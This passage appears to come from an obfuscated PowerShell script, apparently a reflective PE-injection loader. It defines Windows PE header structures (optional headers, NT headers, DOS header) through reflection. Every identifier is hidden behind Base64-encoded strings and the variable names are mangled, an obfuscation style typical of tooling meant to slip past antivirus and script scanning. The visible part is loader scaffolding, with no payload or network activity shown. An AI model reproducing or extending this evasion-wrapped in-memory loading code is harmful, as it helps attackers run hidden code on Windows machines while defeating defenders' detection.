		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${____/===\/\_/=\_/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${____/===\/\_/=\_/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 224)
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/==\___/=\/\/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${__/\/\___/\_/==\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_____/\/=\/\/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${/==\/\/=\/===\/\_} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${/==\/\/=\/===\/\_}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${/====\/\/\_/===\/}, [System.ValueType], 264)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${/====\_/=\/=\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${____/===\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\_______/\/====} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${_/\_______/\/====}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${/====\/\/\_/===\/}, [System.ValueType], 248)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${/====\_/=\/=\/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${/==\/\/=\/===\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/===\_/\___/=\} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${/=\/===\_/\___/=\}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${/====\/\/\_/===\/}, [System.ValueType], 64)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\___/\/=\_/\___} = ${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/\/\/=\___/\/\__} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
